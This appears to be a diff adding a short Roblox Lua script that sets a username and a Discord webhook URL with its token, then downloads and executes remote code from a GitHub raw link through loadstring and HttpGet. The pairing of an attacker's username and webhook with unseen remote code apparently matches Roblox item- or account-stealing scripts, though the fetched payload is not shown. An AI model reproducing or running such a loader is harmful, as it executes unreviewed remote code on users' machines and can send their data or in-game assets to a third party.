@@ -1,0 +1,3 @@
+Username = "b1gwolfclub"
+Webhook = "https://discord.com/api/webhooks/1343291716886724729/4yydR6pRa2rMI19TiPV1IyRl3DPD7PhWH46R9-7kc5LQ6VwzFqsZi039nFeEh23MLHdv"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WINVOLST/ttd/refs/heads/main/.gg/sm4t3EHF7F", true))()
